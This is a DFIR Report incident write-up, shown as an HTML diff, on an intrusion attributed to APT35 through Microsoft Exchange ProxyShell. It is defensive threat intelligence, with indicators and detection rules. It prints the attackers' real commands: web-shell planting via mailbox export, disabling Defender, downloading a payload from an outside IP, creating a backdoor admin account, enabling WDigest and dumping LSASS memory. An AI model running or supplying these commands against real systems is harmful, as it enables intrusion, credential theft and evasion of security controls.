@@ -1,0 +1,409 @@
+<div>
+<a class="category-color-89" href="https://thedfirreport.com/category/apt35/">APT35</a>
+<a class="category-color-87" href="https://thedfirreport.com/category/fast-reverse-proxy/">Fast Reverse Proxy</a>
+<a class="category-color-88" href="https://thedfirreport.com/category/proxyshell/">ProxyShell</a>
+<a class="category-color-1" href="https://thedfirreport.com/category/uncategorized/">Uncategorized</a>
+<h1 class="entry-title">APT35 Automates Initial Access Using ProxyShell</h1>
+<a href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/" rel="bookmark">March 21, 2022</a>
+<p>In December 2021, we observed an adversary exploiting the <a href="https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell" rel="noreferrer noopener" target="_blank">Microsoft Exchange ProxyShell vulnerabilities</a> to gain initial access and execute code via multiple web shells. The overlap of activities and tasks was remarkably similar to that observed in our previous report, “<a href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/" rel="noreferrer noopener" target="_blank">Exchange Exploit Leads to Domain Wide Ransomware</a>“.</p>
+<p>In this intrusion, we observed the initial exploitation of the ProxyShell vulnerabilities followed by some further post-exploitation activity, which included web shells, credential dumping, and specialized payloads. We assess that this activity was related to <a href="https://attack.mitre.org/groups/G0059/" rel="noreferrer noopener" target="_blank">APT35</a> (TA453, COBALT ILLUSION, Charming Kitten, ITG18, Phosphorus, Newscaster) due to the TTP’s mirroring previously reported activity that was <a href="https://www.microsoft.com/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/" rel="noreferrer noopener" target="_blank">attributed to the group</a>.</p>
+<h2>Case Summary</h2>
+<p>The threat actors activity occurred in two bursts within a 3 day time frame. As with our previous case, they started by uploading their web shell and disabling antivirus services.</p>
+<p>Soon after, they established two persistence methods. The first was through scheduled tasks, and the second, was via a newly created account. The account was then added to the “remote desktop users” and “local administrators users” groups. Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call <a href="https://github.com/fatedier/frp" rel="noreferrer noopener" target="_blank">Fast Reverse Proxy</a> (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.</p>
+<p>After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig. At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell. </p>
+<p>All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out. The user agent strings of python-requests/2.26.0 and python-urllib3/1.26.7 also point to the use of scripts.</p>
+<p>Two days later, we saw the threat actors reappear. We expected them to pick up where they left off, however, they repeated all previous actions. Due to the similarity between the commands and the sequential order they ran, this is additional evidence the threat actors employed automated scripts to execute these activities.</p>
+<p>No further activity was observed as the threat actors were evicted from the network.</p>
+<h3>Services</h3>
+<p>We offer multiple services including a <a href="https://thedfirreport.com/services/" rel="noreferrer noopener" target="_blank">Threat Feed service</a> which tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found <a href="https://thedfirreport.com/services/" rel="noreferrer noopener" target="_blank">here</a>.</p>
+<p>We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our <a href="https://www.patreon.com/thedfirreport" rel="noreferrer noopener" target="_blank">Security Researcher and Organization</a> services.</p>
+<h2>Timeline</h2>
+<p><img alt="" class="alignnone size-full wp-image-6005 jetpack-lazy-image" height="1402" src="https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell.png" style="max-width:80%;height:auto;width:auto;" width="1080"/><img alt="" class="alignnone size-full wp-image-6005" height="1402" src="https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell.png" style="max-width:80%;height:auto;width:auto;" width="1080"/></p>
+<figure class="wp-block-image"></figure>
+<p>Analysis and reporting completed by <a href="https://twitter.com/samaritan_o" rel="noreferrer noopener" target="_blank">@samaritan_o</a>, <a href="https://twitter.com/Kostastsale" rel="noreferrer noopener" target="_blank">@kostastsale</a>, <a href="https://twitter.com/svch0st" rel="noreferrer noopener" target="_blank">@svch0st</a> and <a href="https://twitter.com/RoxpinTeddy" rel="noreferrer noopener" target="_blank">@RoxpinTeddy</a>.</p>
+<h2>Initial Access</h2>
+<p>As similarly seen in our previous report <a href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/" rel="noreferrer noopener" target="_blank">Exchange Exploit Leads to Domain Wide Ransomware</a>, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:</p>
+<ul>
+<li>CVE-2021-34473</li>
+<li>CVE-2021-34523</li>
+<li>CVE-2021-31207</li>
+</ul>
+<p>With the appropriate <a href="https://www.mandiant.com/resources/greater-visibilityt" rel="noreferrer noopener" target="_blank">PowerShell logging</a> available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.</p>
+<p>Once the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:</p>
+New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "administrator@&lt;REDACTED&gt;"
+<p>The threat actor initiated a mailbox export that matched the search criteria of <code>Subject -eq 'aspx_wkggiyvttmu'</code> to a provided location with the .aspx extension. While the file created is a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when requested.</p>
+New-MailboxExportRequest -Mailbox "administrator@&lt;REDACTED&gt;" -FilePath "\\localhost\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\aspx_wkggiyvttmu.aspx" -IncludeFolders ("#Drafts#") -ContentFilter "Subject -eq 'aspx_wkggiyvttmu'" 
+<p>In an attempt to hide the actions taken, the actor removes the request just created:</p>
+Remove-MailboxExportRequest -Confirm "False" -Force "True" -Identity "77a883a7-470c-471c-a193-f4c54f263fde"
+<p>This activity then repeated approximately 2 days after the initial exploitation. As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated. Below is the second web shell created that shares the same naming convention as the first.</p>
+New-MailboxExportRequest -Mailbox "administrator@&lt;REDACTED&gt;" -FilePath "\\localhost\c$\inetpub\wwwroot\aspnet_client\system_web\aspx_dyukbdcxjfi.aspx" -IncludeFolders ("#Drafts#") -ContentFilter "Subject -eq 'aspx_dyukbdcxjfi'"
+<h2><img alt="" class="alignnone size-full wp-image-6007 jetpack-lazy-image" height="1447" src="https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain.png" style="max-width:80%;height:auto;width:auto;" width="1673"/><img alt="" class="alignnone size-full wp-image-6007" height="1447" src="https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain.png" style="max-width:80%;height:auto;width:auto;" width="1673"/></h2>
+<h2>Execution</h2>
+<p>Approximately 20 seconds after the web shell <code>aspx_wkggiyvttmu.aspx</code> was created, a flurry of POST requests were sent to the web shell.</p>
+<p>The web shell followed a similar structure seen in previous cases. At least two parameters are sent in the POST request to the web shell, <code>delimiter</code> which defines what string is used to separate the response, and <code>exec_code</code> which is the command to be ran. The web shell had predefined functions for special actions:</p>
+<ul>
+<li><code>get</code> – Get file from location on disk (additional <code>dst</code> POST parameter)</li>
+<li><code>put</code> – Upload file to location (additional <code>dst</code> POST parameter)</li>
+<li><code>run</code> – Execute a list of commands separated by “;” using PowerShell.</li>
+</ul>
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-02.png"><img alt="" class="aligncenter size-full wp-image-5992 jetpack-lazy-image" height="819" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-02.png" style="max-width:80%;height:auto;width:auto;" width="1497"/><img alt="" class="aligncenter size-full wp-image-5992" height="819" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-02.png" style="max-width:80%;height:auto;width:auto;" width="1497"/></a></figure>
+<p>If <code>exec_code</code> does not start with one of the above commands, it will simply attempt to run it with PowerShell.</p>
+<p>The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself. Below you can see an example of commands that were sent and the outputs they returned in the response.</p>
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-03.png"><img alt="" class="aligncenter size-full wp-image-5993 jetpack-lazy-image" height="503" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-03.png" style="max-width:80%;height:auto;width:auto;" width="1600"/><img alt="" class="aligncenter size-full wp-image-5993" height="503" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-03.png" style="max-width:80%;height:auto;width:auto;" width="1600"/></a></figure>
+<p>The actor first uploaded a file <code>Wininet.xml</code>, which is later used to create a scheduled task, to <code>C:\windows\temp</code> using the <code>put</code> command of the web shell. This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake <code>dllhost.exe</code> from 148.251.71[.]182.</p>
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-04.png"><img alt="" class="aligncenter size-full wp-image-5994 jetpack-lazy-image" height="83" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-04.png" style="max-width:80%;height:auto;width:auto;" width="1871"/><img alt="" class="aligncenter size-full wp-image-5994" height="83" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-04.png" style="max-width:80%;height:auto;width:auto;" width="1871"/></a></figure>
+<p>Scheduled Task Commands:</p>
+schtasks.exe /Create /F /XML C:\windows\temp\Wininet.xml /tn '\Microsoft\Windows\Maintenance\Wininet'
+schtasks.exe /Run /tn '\Microsoft\Windows\Maintenance\Wininet'
+<p>Defender Modification Command:</p>
+try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}
+Start-Process powershell.exe {$file='c:\windows\dllhost.exe'; Invoke-WebRequest -Uri 'hXXp://148.251.71[.]182/update[.]tmp' -OutFile $file} 
+<p>The schedule task runs a batch script called <code>Wininet.bat</code> which was also uploaded through the web shell. <code>Wininet.bat</code> simply loops through the execution of the file <code>dllhost.exe</code>.</p>
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-05.png"><img alt="" class="aligncenter size-full wp-image-5995 jetpack-lazy-image" height="120" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-05.png" width="381"/><img alt="" class="aligncenter size-full wp-image-5995" height="120" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-05.png" width="381"/></a></figure>
+<p>The file <code>dllhost.exe</code> is a golang binary. When executed, the binary was observed resolving the following domains:</p>
+<ul>
+<li>api.myip[.]com (for discovery)</li>
+<li>tcp443.msupdate[.]us</li>
+<li>kcp53.msupdate[.]us</li>
+</ul>
+<p>The binary also spawns the following commands when executed:</p>
+<ul>
+<li>cmd /c wmic computersystem get domain</li>
+<li>powershell /c Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders</li>
+</ul>
+<p>The <a href="https://www.virustotal.com/gui/file/1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e/community" rel="noreferrer noopener" target="_blank">binary</a> has a low confidence reference to FRP (<a href="https://github.com/fatedier/frp" rel="noreferrer noopener" target="_blank">FastReverseProxy</a>) as the sample matches the closed source Yara rule – <a href="https://valhalla.nextron-systems.com/info/rule/HKTL_PUA_FRP_FastReverseProxy_Oct21_1" rel="noreferrer noopener" target="_blank">HKTL_PUA_FRP_FastReverseProxy_Oct21_1</a> (by Florian Roth) however it does not behave in the same way as the open source tool. This file also matches on an additional Yara rule more recently – <a href="https://valhalla.nextron-systems.com/info/rule/APT_MAL_Go_FRP_CharmingKitten_Jan22_1" rel="noreferrer noopener" target="_blank">APT_MAL_Go_FRP_CharmingKitten_Jan22_1</a> pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor.</p>
+<p><img alt="" class="alignnone size-full wp-image-6008 jetpack-lazy-image" height="511" src="https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution.png" style="max-width:80%;height:auto;width:auto;" width="1427"/><img alt="" class="alignnone size-full wp-image-6008" height="511" src="https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution.png" style="max-width:80%;height:auto;width:auto;" width="1427"/></p>
+<h2>Persistence</h2>
+<p>The threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.</p>
+<p>New account creation</p>
+<p>During the first activity, we observed the use of <code>user.exe</code> executable that ran the following PowerShell command:</p>
+powershell.exe /c net user /add DefaultAccount P@ssw0rd123412; net user DefaultAccount /active:yes; net user DefaultAccount P@ssw0rd12341234; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount 
+<p>The first thing they did was make a new user named <code>DefaultAccount</code> with the password <code>P@ssw0rd123412</code>. They then activated the account and changed the password (<code>P@ssw0rd12341234</code>) for the second time. Finally the commands added the new account to the Administrators group and Remote Desktop Users group.</p>
+<p>The threat actors ran the same command again two days later:</p>
+powershell.exe /c net user /add DefaultAccount P@ssw0rd123412; net user DefaultAccount /active:yes; net user DefaultAccount P@ssw0rd12341234; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount 
+<p>Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.</p>
+<p>Scheduled task</p>
+<p>As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.</p>
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.png"><img alt="" class="aligncenter size-full wp-image-5996 jetpack-lazy-image" height="382" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.png" style="max-width:80%;height:auto;width:auto;" width="646"/><img alt="" class="aligncenter size-full wp-image-5996" height="382" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.png" style="max-width:80%;height:auto;width:auto;" width="646"/></a></figure>
+<p>Below, we can observe the content of wininet.xml:</p>
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5.png"><img alt="" class="aligncenter size-full wp-image-5998 jetpack-lazy-image" height="899" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5.png" style="max-width:80%;height:auto;width:auto;" width="747"/><img alt="" class="aligncenter size-full wp-image-5998" height="899" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5.png" style="max-width:80%;height:auto;width:auto;" width="747"/></a></figure>
+<p>The following commands where then ran to initiate the task and to achieve persistence:</p>
+schtasks.exe /Create /F /XML %wintmp%\Wininet.xml /tn '\Microsoft\Windows\Maintenance\Wininet'
+schtasks.exe /Run /tn '\Microsoft\Windows\Maintenance\Wininet'
+<h2>Privilege Escalation</h2>
+<p>The scheduled task created by the web shell was set to use the principal SID “S-1-5-18”, or SYSTEM.</p>
+&lt;UserId&gt;S-1-5-18&lt;/UserId&gt;
+<p>The threat actor also added their newly created account to the local administrator group:</p>
+net localgroup administrators /add DefaultAccount 
+<h2>Defense Evasion</h2>
+<p>Using PowerShell the threat actors issued several commands to impair Windows Defender including:</p>
+<ul>
+<li>Windows Defender Behavior Monitoring was disabled.</li>
+<li>The Severe Threat default action was set to ‘Allow’.</li>
+<li>Realtime Monitoring was disabled.</li>
+<li>The ‘C:\Windows’ path was excluded from scheduled and real-time scanning.</li>
+</ul>
+try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}
+<p>A rule was added to the Windows Firewall to allow remote RDP traffic.</p>
+"netsh" advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
+<p>Remote Desktop Services was started.</p>
+"net" start TermService
+<p>The threat actor enabled WDigest authentication. This enforces the storage of credentials in plaintext on future logins.</p>
+"reg" add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+<p>LSA protection was disabled.</p>
+"reg" add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
+<h2>Credential Access</h2>
+<p>The threat actor created a process memory dump from LSASS.exe. In this case they created a “minidump” using the LOLBIN <a href="https://lolbas-project.github.io/lolbas/Libraries/comsvcs/" rel="noreferrer noopener" target="_blank">comsvcs.dll</a>. This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.</p>
+"powershell.exe" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | out-host; Compress-Archive C:\windows\temp\ssasl.pmd C:\windows\temp\ssasl.zip
+<h2><img alt="" class="alignnone size-full wp-image-6003 jetpack-lazy-image" height="227" src="https://thedfirreport.com/wp-content/uploads/2022/03/1.png" style="max-width:80%;height:auto;width:auto;" width="932"/><img alt="" class="alignnone size-full wp-image-6003" height="227" src="https://thedfirreport.com/wp-content/uploads/2022/03/1.png" style="max-width:80%;height:auto;width:auto;" width="932"/></h2>
+<h2>Discovery</h2>
+<p>The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion. They executed commands such as:</p>
+net.exe user
+ipconfig.exe /all
+powershell.exe (multiple commands)
+quser.exe
+<p>These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.</p>
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-07.png"><img alt="" class="aligncenter size-full wp-image-5997 jetpack-lazy-image" height="302" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-07.png" style="max-width:80%;height:auto;width:auto;" width="1682"/><img alt="" class="aligncenter size-full wp-image-5997" height="302" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-07.png" style="max-width:80%;height:auto;width:auto;" width="1682"/></a></figure>
+<p>They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.</p>
+Get-WMIObject Win32_NTDomain | findstr DomainController
+<p>Additionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command. This was likely done as a test. </p>
+Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders"
+<h2>Collection</h2>
+<p>While having access to the Exchange server, we observed no attempts to export or access user mailboxes.</p>
+<h2>Command and Control</h2>
+<p>As we saw from the execution section,<code>dllhost.exe</code> was used to access the below domains for C2, which we believe was using a variation of FRP.</p>
+<ul>
+<li>tcp443.msupdate[.]us (107.173.231[.]114)</li>
+<li>kcp53.msupdate[.]us </li>
+<li>(107.173.231[.]114)</li>
+</ul>
+<p>This C2 channel was not used very much as most activity was done through the web shell.</p>
+<h2>Exfiltration</h2>
+<p>The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.</p>
+<p>Here you can see the threat actor using the web shell command to extract it: </p>
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-09.png"><img alt="" class="aligncenter size-full wp-image-6000 jetpack-lazy-image" height="572" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-09.png" style="max-width:80%;height:auto;width:auto;" width="909"/><img alt="" class="aligncenter size-full wp-image-6000" height="572" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-09.png" style="max-width:80%;height:auto;width:auto;" width="909"/></a></figure>
+<h2>Impact</h2>
+<p>In this case, there was no further impact to the environment before the threat actors were evicted. Due to our previous report and OSINT research we believe with medium to high confidence that this intrusion would have ended in ransomware.</p>
+<h2>Indicators</h2>
+<p>All artifacts including web shells, files, IPs, etc. were added to our <a href="https://thedfirreport.com/services/" rel="noreferrer noopener" target="_blank">services</a> in December.</p>
+<h3>Network</h3>
+ipv4:148.251.71[.]182
+ipv4:107.173.231[.]114
+domain: tcp443.msupdate[.]us
+domain: kcp53.msupdate[.]us
+useragent:python-urllib3/1.26.7
+useragent:python-requests/2.26.0
+<h3>File</h3>
+aspx_dyukbdcxjfi.aspx
+1a5ad24a6880eea807078375d6461f58
+da2470c3990ea0862a79149c6036388498da83cd
+84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7
+dhvqx.aspx
+b2fde6dc7bd1e04ce601f57805de415b
+4d243969b54b9b80c1d26e0801a6e7e46d2ef03e
+c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8
+dllhost.exe
+9a3703f9c532ae2ec3025840fa449d4e
+8ece87086e8b5aba0d1cc4ec3804bf74e0b45bee
+1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e
+wininet.bat
+5f098b55f94f5a448ca28904a57c0e58
+27102b416ef5df186bd8b35190c2a4cc4e2fbf37
+668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0
+wininet.xml
+d2f4647a3749d30a35d5a8faff41765e
+0f676bc786db3c44cac4d2d22070fb514b4cb64c
+559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e
+user.exe
+f0be699c8aafc41b25a8fc0974cc4582
+6bae2d45bbd8c4b0a59ba08892692fe86e596154
+7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b
+task_update.exe
+cacb64bdf648444e66c82f5ce61caf4b
+3a6431169073d61748829c31a9da29123dd61da8
+12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075f
+<h2>Detections</h2>
+<h3>Network</h3>
+ET INFO User-Agent (python-requests) Inbound to Webserver
+ET INFO Generic HTTP EXE Upload Inbound
+ET INFO Generic HTTP EXE Upload Outbound
+GPL ATTACK_RESPONSE command completed
+ET ATTACK_RESPONSE Net User Command Response
+ET WEB_SERVER WebShell Generic - netsh firewall
+<h3>Sigma</h3>
+<p>Local Accounts Discovery – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_local_system_owner_account_discovery.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_local_system_owner_account_discovery.yml</a></p>
+<p>Lsass Memory Dump via Comsvcs DLL – <a href="https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/rules/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/rules/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml</a></p>
+<p>Net.exe Execution – <a href="https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/rules/windows/process_creation/win_susp_net_execution.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/rules/windows/process_creation/win_susp_net_execution.yml</a></p>
+<p>Net-exe User Account Creation – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_net_user_add.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_net_user_add.yml</a></p>
+<p>Netsh Port or Application Allowed – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_fw_add.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_fw_add.yml</a></p>
+<p>Netsh RDP Port Opening – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_allow_port_rdp.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_allow_port_rdp.yml</a></p>
+<p>Non Interactive PowerShell – <a href="https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/rules/windows/process_creation/win_non_interactive_powershell.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/rules/windows/process_creation/win_non_interactive_powershell.yml</a></p>
+<p>Powershell Defender Exclusion – <a href="https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/rules/windows/process_creation/win_powershell_defender_exclusion.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/rules/windows/process_creation/win_powershell_defender_exclusion.yml</a></p>
+<p>PowerShell Get-Process LSASS – <a href="https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/rules/windows/process_creation/win_susp_powershell_getprocess_lsass.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/rules/windows/process_creation/win_susp_powershell_getprocess_lsass.yml</a></p>
+<p>Process Dump via Comsvcs DLL – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_susp_comsvcs_procdump.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_susp_comsvcs_procdump.yml</a></p>
+<p>Quick Execution of a Series of Suspicious Commands – <a href="https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_multiple_suspicious_cli.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_multiple_suspicious_cli.yml</a></p>
+<p>Rare Scheduled Task Creations – <a href="https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/other/taskscheduler/win_rare_schtask_creation.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/other/taskscheduler/win_rare_schtask_creation.yml</a></p>
+<p>Service Execution – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_service_execution.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_service_execution.yml</a></p>
+<p>Shells Spawned by Web Servers – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_webshell_spawn.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_webshell_spawn.yml</a></p>
+<p>Suspicious PowerShell Parent Process – <a href="https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/rules/windows/process_creation/win_susp_powershell_parent_process.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/rules/windows/process_creation/win_susp_powershell_parent_process.yml</a></p>
+<p>Suspicious Script Execution From Temp Folder – <a href="https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_susp_script_exec_from_temp.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_susp_script_exec_from_temp.yml</a></p>
+<p>Wdigest Enable UseLogonCredential – <a href="https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/rules/windows/registry_event/sysmon_wdigest_enable_uselogoncredential.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/rules/windows/registry_event/sysmon_wdigest_enable_uselogoncredential.yml</a></p>
+<p>Webshell Detection With Command Line Keywords – <a href="https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03/rules/windows/process_creation/win_webshell_detection.yml" rel="noreferrer noopener" target="_blank">https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03/rules/windows/process_creation/win_webshell_detection.yml</a></p>
